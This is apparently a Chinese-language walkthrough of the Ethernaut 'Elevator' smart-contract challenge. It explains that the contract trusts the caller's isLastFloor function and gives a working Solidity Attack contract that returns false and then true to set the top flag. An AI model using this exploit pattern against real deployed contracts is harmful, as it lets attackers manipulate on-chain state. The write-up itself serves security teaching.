# Elevator

Elevator 這一關要求我們達到building的最高層。我們先看一下合約的代碼。

## 合约代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
``` 

## 代码分析
首先看到Building的interface中，有一個叫做`isLastFloor`的函數，入參為uint而返回一個boolean值。而看`Elevator`合約，有兩個狀態變量，一個是boolean型的`top`，另一個是uint型的`floor`。而goTo函數中，首先將`msg.sender`轉換爲`Building`型，然後調用`isLastFloor`函數，如果返回值爲`false`，則將`floor`設置成我們的入參`_floor`，並且將`top`定義為`isLastFloor(floor)`的返回值。如果要完成這關的要求，我們就需要再第一次`isLastFloor`函數返回`false`,並且在接下來的第二次調用`isLastFloor`函數時返回`true`。

由於`isLastFloor`這個函數是屬於`msg.sender`，所以我們完全可以自己定義一個`isLastFloor`來達到第一次返回`false`，第二次返回`true`的要求。

## 攻击代码
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Attack{
    Elevator private immutable target;
    bool manual_bool = true;

    constructor (address _target) {  
        target = Elevator(_target);
    }

    function go() external {
        target.goTo(1);
        require(target.top(), "Failed to reach top floor");
    }

    function isLastFloor(uint) external returns (bool) {
        manual_bool = !manual_bool;
        return manual_bool;
    }
}



interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## 攻击过程
1. 部署Attack合約，並且將Elevator合約的地址作爲入參傳入。
2. 調用go函數，完成任務。
